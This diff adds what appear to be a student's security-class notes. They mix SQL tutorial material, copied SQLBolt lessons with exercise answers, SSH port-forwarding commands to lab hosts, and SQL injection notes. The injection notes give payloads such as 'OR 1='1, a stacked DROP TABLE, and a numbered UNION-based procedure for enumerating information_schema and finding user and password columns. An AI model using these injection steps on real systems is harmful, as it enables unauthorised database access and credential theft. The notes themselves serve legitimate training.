@@ -1,1 +1,537 @@
+ssh -MS /tmp/demo demo1@10.50.12.21 -Nf 2>/dev/null
+ssh -S /tmp/demo demo -O forward -L 6767:10.208.50.61:80
+'OR 1='1
+'OR 1='1
+
+
+
+Standard Commands
+
+SELECT
+Extracts data from a database
+
+UNION
+Used to combine the result-set of two or more SELECT statements
+
+USE
+Selects the DB to use
+
+UPDATE
+Updates data in a database
+
+DELETE
+Deletes data from a database
+
+INSERT INTO
+Inserts new data into a database
+
+CREATE DATABASE
+creates a new database
+
+ALTER DATABASE
+Modifies a database
+
+CREATE TABLE
+Creates a new table
+
+ALTER TABLE
+Modifies a table
+
+DROP TABLE
+Deletes a table
+
+CREATE INDEX
+Creates an index (search key)
+
+DROP INDEX
+Deletes an index
+
+https://www.w3schools.com/SQL/sql_syntax.asp
+
+
+
+
+Activity
+
+SQLBOLT
+
+Interactive tutorials 1-11 and 13
+
+https://sqlbolt.com/
+
+
+SQL Injection - Considerations
+Requires Valid SQL Queries
+
+Fully patched systems can be vulnerable due to misconfiguration
+
+Input Field Sanitization
+
+String vs Integer Values
+
+Is information_schema Database available?
+
+GET Request versus POST Request HTTP methods
+
+
+Unsanitized vs Sanitized Fields
+Unsanitized: input fields can be found using a Single Quote ⇒ '
+
+Will return extraneous information
+
+' closes a variable, to allow for additional statements/clauses
+
+May show no errors or generic error (harder Injection)
+
+Sanitized: input fields are checked for items that might harm the database (Items are removed, escaped, or turned into a single string)
+
+Validation: checks inputs to ensure it meets a criteria (String doesn’t contain ')
+
+
+
+Server-Side Query Processing
+User enters JohnDoe243 in the name form field and pass1234 in the pass form field.
+
+
+The Server-Side Query that would be passed to MySQL from PHP would be:
+
+
+BEFORE INPUT:
+
+SELECT id FROM users WHERE name=‘$name’ AND pass=‘$pass’;
+
+
+AFTER INPUT:
+
+SELECT id FROM users WHERE name=‘JohnDoe243’ AND pass=‘pass1234’;
+
+
+Example - Injecting Your Statement
+User enters tom' OR 1='1 in the name and pass fields.
+
+Truth Statement: tom ' OR 1='1
+
+Server-Side query executed would appear like this:
+SELECT id FROM users WHERE name=‘tom' OR 1='1’ AND pass=‘tom' OR 1='1’
+
+
+
+
+
+
+
+ SQL Lesson 2: Queries with constraints (Pt. 1)
+
+Now we know how to select for specific columns of data from a table, but if you had a table with a hundred million rows of data, reading through all the rows would be inefficient and perhaps even impossible.
+
+In order to filter certain results from being returned, we need to use a WHERE clause in the query. The clause is applied to each row of data by checking specific column values to determine whether it should be included in the results or not.
+Select query with constraints
+SELECT column, another_column, …
+FROM mytable
+WHERE condition
+    AND/OR another_condition
+    AND/OR …;
+
+More complex clauses can be constructed by joining numerous AND or OR logical keywords (ie. num_wheels >= 4 AND doors <= 2). And below are some useful operators that you can use for numerical data (ie. integer or floating point):
+Operator 	Condition 	SQL Example
+=, !=, <, <=, >, >= 	Standard numerical operators 	col_name != 4
+BETWEEN … AND … 	Number is within range of two values (inclusive) 	col_name BETWEEN 1.5 AND 10.5
+NOT BETWEEN … AND … 	Number is not within range of two values (inclusive) 	col_name NOT BETWEEN 1 AND 10
+IN (…) 	Number exists in a list 	col_name IN (2, 4, 6)
+NOT IN (…) 	Number does not exist in a list 	col_name NOT IN (1, 3, 5)
+
+In addition to making the results more manageable to understand, writing clauses to constrain the set of rows returned also allows the query to run faster due to the reduction in unnecessary data being returned.
+Did you know?
+
+As you might have noticed by now, SQL doesn't require you to write the keywords all capitalized, but as a convention, it helps people distinguish SQL keywords from column and tables names, and makes the query easier to read.
+
+
+
+
+
+
+
+
+SQL Lesson 3: Queries with constraints (Pt. 2)
+
+When writing WHERE clauses with columns containing text data, SQL supports a number of useful operators to do things like case-insensitive string comparison and wildcard pattern matching. We show a few common text-data specific operators below:
+Operator 	Condition 	Example
+= 	Case sensitive exact string comparison (notice the single equals) 	col_name = "abc"
+!= or <> 	Case sensitive exact string inequality comparison 	col_name != "abcd"
+LIKE 	Case insensitive exact string comparison 	col_name LIKE "ABC"
+NOT LIKE 	Case insensitive exact string inequality comparison 	col_name NOT LIKE "ABCD"
+% 	Used anywhere in a string to match a sequence of zero or more characters (only with LIKE or NOT LIKE) 	col_name LIKE "%AT%"
+(matches "AT", "ATTIC", "CAT" or even "BATS")
+_ 	Used anywhere in a string to match a single character (only with LIKE or NOT LIKE) 	col_name LIKE "AN_"
+(matches "AND", but not "AN")
+IN (…) 	String exists in a list 	col_name IN ("A", "B", "C")
+NOT IN (…) 	String does not exist in a list 	col_name NOT IN ("D", "E", "F")
+Did you know?
+
+All strings must be quoted so that the query parser can distinguish words in the string from SQL keywords.
+
+We should note that while most database implementations are quite efficient when using these operators, full-text search is best left to dedicated libraries like Apache Lucene or Sphinx. These libraries are designed specifically to do full text search, and as a result are more efficient and can support a wider variety of search features including internationalization and advanced queries.
+Exercise
+
+Here's the definition of a query with a WHERE clause again, go ahead and try and write some queries with the operators above to limit the results to the information we need in the tasks below.
+Select query with constraints
+SELECT column, another_column, …
+FROM mytable
+WHERE condition
+    AND/OR another_condition
+    AND/OR …;
+
+
+SELECT * FROM movies
+Where Title Like "%toy story%";
+
+
+
+ SQL Lesson 4: Filtering and sorting Query results
+
+Even though the data in a database may be unique, the results of any particular query may not be – take our Movies table for example, many different movies can be released the same year. In such cases, SQL provides a convenient way to discard rows that have a duplicate column value by using the DISTINCT keyword.
+Select query with unique results
+SELECT DISTINCT column, another_column, …
+FROM mytable
+WHERE condition(s);
+
+Since the DISTINCT keyword will blindly remove duplicate rows, we will learn in a future lesson how to discard duplicates based on specific columns using grouping and the GROUP BY clause.
+Ordering results
+
+Unlike our neatly ordered table in the last few lessons, most data in real databases are added in no particular column order. As a result, it can be difficult to read through and understand the results of a query as the size of a table increases to thousands or even millions rows.
+
+To help with this, SQL provides a way to sort your results by a given column in ascending or descending order using the ORDER BY clause.
+Select query with ordered results
+SELECT column, another_column, …
+FROM mytable
+WHERE condition(s)
+ORDER BY column ASC/DESC;
+
+When an ORDER BY clause is specified, each row is sorted alpha-numerically based on the specified column's value. In some databases, you can also specify a collation to better sort data containing international text.
+Limiting results to a subset
+
+Another clause which is commonly used with the ORDER BY clause are the LIMIT and OFFSET clauses, which are a useful optimization to indicate to the database the subset of the results you care about.
+The LIMIT will reduce the number of rows to return, and the optional OFFSET will specify where to begin counting the number rows from.
+Select query with limited rows
+SELECT column, another_column, …
+FROM mytable
+WHERE condition(s)
+ORDER BY column ASC/DESC
+LIMIT num_limit OFFSET num_offset;
+
+If you think about websites like Reddit or Pinterest, the front page is a list of links sorted by popularity and time, and each subsequent page can be represented by sets of links at different offsets in the database. Using these clauses, the database can then execute queries faster and more efficiently by processing and returning only the requested content.
+Did you know?
+
+If you are curious about when the LIMIT and OFFSET are applied relative to the other parts of a query, they are generally done last after the other clauses have been applied. We'll touch more on this in Lesson 12: Order of execution after introducting a few more parts of the query.
+
+SELECT DISTINCT director FROM movies
+ORDER BY director ASC;
+
+SELECT DISTINCT Title, Year FROM movies
+ORDER BY YEAR DESC
+Limit 4;
+
+
+SELECT DISTINCT Title FROM movies
+ORDER BY Title ASC
+Limit 5;
+
+
+SELECT * FROM movies
+ORDER BY Title ASC
+Limit 5 Offset 5;
+
+
+
+
+
+
+
+SQL Review: Simple SELECT Queries
+
+You've done a good job getting to this point! Now that you've gotten a taste of how to write a basic query, you need to practice writing queries that solve actual problems.
+SELECT query
+SELECT column, another_column, …
+FROM mytable
+WHERE condition(s)
+ORDER BY column ASC/DESC
+LIMIT num_limit OFFSET num_offset;
+Exercise
+
+In the exercise below, you will be working with a different table. This table instead contains information about a few of the most populous cities of North America[1] including their population and geo-spatial location in the world.
+Did you know?
+
+Positive latitudes correspond to the northern hemisphere, and positive longitudes correspond to the eastern hemisphere. Since North America is north of the equator and west of the prime meridian, all of the cities in the list have positive latitudes and negative longitudes.
+
+Try and write some queries to find the information requested in the tasks below. You may have to use a different combination of clauses in your query for each task. Once you're done, continue onto the next lesson to learn about queries that span multiple tables.
+
+
+SELECT city, population FROM north_american_cities
+WHERE country = "Canada";
+
+
+Stacking Statements
+Chaining multiple statements together using a semi-colon ;
+
+SELECT * FROM user WHERE id=‘Johnny'; DROP TABLE Customers; --’
+
+
+
+Nesting statements
+
+Some Web Application + SQL Database combinations do not allow stacking, such as PHP and MySQL.
+
+Though they may allow for nesting a statement within an existing one:
+
+php?key=<value> UNION SELECT 1,column_name,3 from information_schema.columns where table_name = 'members'
+
+
+Ignore the rest
+Using # or -- tells the Database to ignore everything after
+
+
+
+Server-Side Query:
+
+SELECT product FROM item WHERE id = $select limit 1;
+
+
+
+Input to Inject:
+
+1 or 1=1; #
+
+Server-Side Query becomes:
+
+SELECT product FROM item WHERE id = 1 or 1=1; # limit 1;
+
+Audi 'Union select 1,2,3,4,5 #'
+
+'OR 1='1
+
+
+1. Find vulnerable input & 'OR 1='1
+Selection=3 or 1=1
+
+2. Numbers of columns with numbers
+Audi' UNION SELECT 1,2,3,4,5 FROM information_schema.tables #
+Selection=3 UNION SELECT 1,2,3 #
+
+3. Golden statement
+Audi' UNION SELECT 1,2,table_schema,table_name,column_name FROM information_schema.columns; #
+Selection=2 UNION SELECT table_schema,table_name,column_name FROM information_schema.columns; #
+
+4. Audi' UNION SELECT tireid,2,size,cost,5
+
+Selection=2 UNION SELECT null,name,color FROM car
+
+
+
+1 	session 	user 	id
+1 	session 	user 	name
+1 	session 	user 	pass
+1 	session 	userinfo 	studentID
+1 	session 	userinfo 	username
+1 	session 	userinfo 	passwd
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 
